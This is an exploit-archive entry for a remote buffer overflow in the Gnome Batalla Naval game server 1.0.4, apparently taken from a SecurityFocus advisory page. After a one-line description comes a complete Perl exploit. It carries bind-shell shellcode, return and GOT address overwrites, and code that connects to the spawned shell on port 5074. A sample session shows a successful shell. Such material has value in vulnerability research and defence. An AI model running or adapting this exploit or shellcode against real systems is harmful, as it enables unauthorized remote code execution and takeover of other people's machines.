source: http://www.securityfocus.com/bid/7699/info

Batalla Naval is prone to a remotely exploitable buffer overflow when handling requests of excessive length. This could allow for execution of malicious instructions in the context of the game server. 

#!/usr/bin/perl
# Priv8security.com remote exploit for Gnome Batalla Naval Server v1.0.4
#
#    Game url http://batnav.sourceforge.net/
#    Tested against Mandrake 9.0
#
#    [wsxz@localhost buffer]$ perl priv8gbn.pl 127.0.0.1
#    Connected!
#    [+] Using ret address: 0xbffff3a2
#    [+] Using got address: 0x804f8dc
#    [+] Sending stuff...
#    [+] Done ;pPPp
#    [?] Now lets see if we got a shell...
#    [+] Enjoy your stay on this server =)
#    Linux wsxz.box 2.4.21-0.13mdk #1 Fri Mar 14 15:08:06 EST 2003
i686 unknown unknown GNU/Linux
#    uid=503(wsxz) gid=503(wsxz) groups=503(wsxz)
#

use IO::Socket;
if (@ARGV < 1 || @ARGV > 3) {
print "-= Priv8security.com remote gbatnav-1.0.4 server on linux =-\n";
print "Usage: perl $0 <host> <port=1995> <offset=100>\n";
exit;
}
if (@ARGV >= 2) {
$port = $ARGV[1];
$offset = $ARGV[2];
} else {
$port = 1995;
$offset = 0;
}
$shellcode = #bind shellcode port 5074 by s0t4ipv6@shellcode.com.ar
"\x31\xc0\x50\x40\x89\xc3\x50\x40\x50\x89\xe1\xb0\x66".
"\xcd\x80\x31\xd2\x52\x66\x68\x13\xd2\x43\x66\x53\x89\xe1".
"\x6a\x10\x51\x50\x89\xe1\xb0\x66\xcd\x80\x40\x89\x44\x24\x04".
"\x43\x43\xb0\x66\xcd\x80\x83\xc4\x0c\x52\x52\x43\xb0\x66".
"\xcd\x80\x93\x89\xd1\xb0\x3f\xcd\x80\x41\x80\xf9\x03\x75\xf6".
"\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53".
"\x89\xe1\xb0\x0b\xcd\x80";

$ret = 0xbffff3a2; # ret mdk 9.0
$gotaddr = 0x0804f8dc; #objdump -R ./gbnserver | grep strcpy
$new_ret = pack('l', ($ret + $offset));
$new_got = pack('l', ($gotaddr));
$buffer .= "\x90" x (500 - length($shellcode));
$buffer .= $shellcode;
$buffer .= $new_got;
$buffer .= $new_ret x 20;



$f = IO::Socket::INET->new(Proto=>"tcp",
PeerHost=>$ARGV[0],PeerPort=>$port)
or die "Cant connect to server or port...\n";

print "Connected!\n";
print "[+] Using ret address: 0x", sprintf('%lx',($ret)), "\n";
print "[+] Using got address: 0x", sprintf('%lx',($gotaddr)), "\n";
print "[+] Sending stuff...\n";
print $f "$buffer\r\n\r\n";
print "[+] Done ;pPPp\n";
print "[?] Now lets see if we got a shell...\n";
close($f);

$handle = IO::Socket::INET->new(Proto=>"tcp",
PeerHost=>$ARGV[0],PeerPort=>5074,Type=>SOCK_STREAM,Reuse=>1)
or die "[-] No luck, try next time ok ...\n";

print "[+] Enjoy your stay on this server =)\n";

$handle->autoflush(1);
print $handle "uname -a;id\n";

    # split the program into two processes, identical twins
    die "cant fork: $!" unless defined($kidpid = fork());

    # the if{} block runs only in the parent process
    if ($kidpid) {
        # copy the socket to standard output
        while (defined ($line = <$handle>)) {
            print STDOUT $line;
        }
        kill("TERM", $kidpid);  # send SIGTERM to child
    }
    # the else{} block runs only in the child process
    else {
        # copy standard input to the socket
        while (defined ($line = <STDIN>)) {
            print $handle $line;
        }
    }
